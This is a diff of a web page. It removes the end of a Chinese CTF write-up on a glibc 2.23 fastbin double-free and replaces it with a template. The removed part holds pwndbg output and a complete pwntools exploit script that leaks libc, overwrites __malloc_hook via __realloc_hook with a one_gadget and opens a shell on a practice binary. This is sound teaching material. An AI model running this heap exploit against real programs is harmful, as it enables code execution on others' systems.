-            <p><a href="https://xz.aliyun.com/t/2720">3. glibc里的one gadget</a></p>
-            <p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/#fastbin-double-free">4. Fastbin Attack - CTF Wiki</a></p>
-            <h3 id="利用-realloc-调整栈使one_gadget生效">利用 realloc 调整栈使one_gadget生效</h3>
-            <p>一番搜索无果后，继续选择问 Lotus ✌，</p>
-            <blockquote>
-                <p>废物小高：找到的one_gadget 都不行，这种情况咋搞</p>
-                <p>废物小高：[不知所措.gif]</p>
-                <p>Lotus ✌ :  用 realloc_hook 调一下，https://blog.csdn.net/Invin_cible/article/details/123042819?spm=1001.2014.3001.5501</p>
-            </blockquote>
-            <p>文章看了一下，个人理解就是把 <code>__malloc_hook</code> 的值设置为 <code>realloc + ofsset</code> ，然后 <code>malloc</code> 的时候就会触发 <code>realloc</code>，并利用 <code>offset</code> 对 <code>rsp</code> 的值进行调整，再把 <code>__realloc_hook</code>的值设置为 <code>one_gadget</code> ，这样在 <code>realloc</code> 触发后就会继续触发 <code>one_gadget</code>。通过前面的查看可以得知，<code>__realloc_hook</code> 就在  <code>__malloc_hook</code> 前面紧挨着。看 一下  <code>realloc</code> 函数的内容，发现和  Lotus ✌ 博客里的一样</p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>pwndbg&gt; x/20i <span style="color:#ae81ff">140391966390032</span>
-</span></span><span style="display:flex;"><span>   0x7faf8d493710 &lt;__GI___libc_realloc&gt;:        push   r15
-</span></span><span style="display:flex;"><span>   0x7faf8d493712 &lt;__GI___libc_realloc+2&gt;:      push   r14
-</span></span><span style="display:flex;"><span>   0x7faf8d493714 &lt;__GI___libc_realloc+4&gt;:      push   r13
-</span></span><span style="display:flex;"><span>   0x7faf8d493716 &lt;__GI___libc_realloc+6&gt;:      push   r12
-</span></span><span style="display:flex;"><span>   0x7faf8d493718 &lt;__GI___libc_realloc+8&gt;:      mov    r12,rsi
-</span></span><span style="display:flex;"><span>   0x7faf8d49371b &lt;__GI___libc_realloc+11&gt;:     push   rbp
-</span></span><span style="display:flex;"><span>   0x7faf8d49371c &lt;__GI___libc_realloc+12&gt;:     push   rbx
-</span></span><span style="display:flex;"><span>   0x7faf8d49371d &lt;__GI___libc_realloc+13&gt;:     mov    rbx,rdi
-</span></span><span style="display:flex;"><span>   0x7faf8d493720 &lt;__GI___libc_realloc+16&gt;:     sub    rsp,0x38
-</span></span><span style="display:flex;"><span>   0x7faf8d493724 &lt;__GI___libc_realloc+20&gt;:     mov    rax,QWORD PTR <span style="color:#f92672">[</span>rip+0x33f8a5<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x7faf8d7d2fd0</span>
-</span></span><span style="display:flex;"><span>   0x7faf8d49372b &lt;__GI___libc_realloc+27&gt;:     mov    rax,QWORD PTR <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>   0x7faf8d49372e &lt;__GI___libc_realloc+30&gt;:     test   rax,rax
-</span></span><span style="display:flex;"><span>   0x7faf8d493731 &lt;__GI___libc_realloc+33&gt;:     jne    0x7faf8d493958 &lt;__GI___libc_realloc+584&gt;
-</span></span><span style="display:flex;"><span>   0x7faf8d493737 &lt;__GI___libc_realloc+39&gt;:     test   rsi,rsi
-</span></span><span style="display:flex;"><span>   0x7faf8d49373a &lt;__GI___libc_realloc+42&gt;:     sete   dl
-</span></span><span style="display:flex;"><span>   0x7faf8d49373d &lt;__GI___libc_realloc+45&gt;:     test   rdi,rdi
-</span></span><span style="display:flex;"><span>   0x7faf8d493740 &lt;__GI___libc_realloc+48&gt;:     setne  al
-</span></span><span style="display:flex;"><span>   0x7faf8d493743 &lt;__GI___libc_realloc+51&gt;:     and    al,dl
-</span></span><span style="display:flex;"><span>   0x7faf8d493745 &lt;__GI___libc_realloc+53&gt;:     jne    0x7faf8d493a70 &lt;__GI___libc_realloc+864&gt;
-</span></span><span style="display:flex;"><span>   0x7faf8d49374b &lt;__GI___libc_realloc+59&gt;:     test   rdi,rdi
-</span></span></code></pre></div><p>那就一个个试一下，看看栈，发现当 offset 为 <code>0xc</code> 的时候，此时 <code>[rsp + 30] == null</code> 存在满足条件的 <code>one_gadget</code></p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>pwndbg&gt; x/10gx $rsp
-</span></span><span style="display:flex;"><span>0x7fff9c8fa700: 0x00007faf8d49395f      0x00007faf8d48982b
-</span></span><span style="display:flex;"><span>0x7fff9c8fa710: 0x0000000000000004      0x00007faf8d7d4620
-</span></span><span style="display:flex;"><span>0x7fff9c8fa720: 0x000055c3e9e00da7      0x00007faf8d47e80a
-</span></span><span style="display:flex;"><span>0x7fff9c8fa730: 0x0000000000000000      0x0000000000000000
-</span></span><span style="display:flex;"><span>0x7fff9c8fa740: 0x0000000000000000      0x000055c3e9e00a6d
-</span></span></code></pre></div><p>所以，完整脚本如下：</p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level = logging.DEBUG</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>sh <span style="color:#f92672">=</span> process(<span style="color:#e6db74">'./double_free'</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">'./libc-2.23.so'</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">alloc</span>(size, content):
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">'choice</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">'</span>)
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span>)
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">'size</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">'</span>)
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">'</span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">'</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">'utf-8'</span>))
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">'content</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">'</span>)
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>sendline(content)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(id):
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">'choice</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">'</span>)
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">'2'</span>)
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">'idx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">'</span>)
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">'</span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">'</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">'utf-8'</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(id):
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">'choice</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">'</span>)
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">'3'</span>)
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">'idx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">'</span>)
-</span></span><span style="display:flex;"><span>    sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">'</span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">'</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">'utf-8'</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># leak libc base</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>)
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span>) <span style="color:#75715e"># 防止 unsorted 的那个chunk 和 top chunk 紧邻</span>
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>show(<span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> sh<span style="color:#f92672">.</span>recvline(keepends<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">'</span>)
-</span></span><span style="display:flex;"><span>libc_addr <span style="color:#f92672">=</span> u64(r) <span style="color:#f92672">-</span> <span style="color:#ae81ff">3951480</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(hex(libc_addr))</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>__malloc_hook <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">'__malloc_hook'</span>] <span style="color:#f92672">+</span> libc_addr
-</span></span><span style="display:flex;"><span>realloc <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">'realloc'</span>] <span style="color:#f92672">+</span> libc_addr
-</span></span><span style="display:flex;"><span>ogg <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4527a</span> <span style="color:#f92672">+</span> libc_addr
-</span></span><span style="display:flex;"><span>evil_chunk <span style="color:#f92672">=</span> __malloc_hook <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x23</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># double free</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span>) <span style="color:#75715e"># 2</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span>) <span style="color:#75715e"># 3</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">2</span>)
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">3</span>)
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">2</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, p64(evil_chunk)) <span style="color:#75715e"># 4</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span>) <span style="color:#75715e"># 5</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, p64(evil_chunk)) <span style="color:#75715e"># 6</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'a'</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">'a'</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x3</span> <span style="color:#f92672">+</span> p64(ogg) <span style="color:#f92672">+</span> p64(realloc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#75715e"># 6</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(sh, f'b *{hex(ogg)}')</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># pause()</span>
-</span></span><span style="display:flex;"><span>sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">'choice</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">'</span>)
-</span></span><span style="display:flex;"><span>sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span>)
-</span></span><span style="display:flex;"><span>sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">'size</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">'</span>)
-</span></span><span style="display:flex;"><span>sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">'</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0x60</span><span style="color:#e6db74">}</span><span style="color:#e6db74">'</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">'utf-8'</span>))
-</span></span><span style="display:flex;"><span>sh<span style="color:#f92672">.</span>interactive()
-</span></span></code></pre></div>
+            <h1>{{ title }}</h1>
+            {{ markdown|safe }}
         </article>
 
     </div>
 </main>
 
-</body></html>
+</body>
+</html>
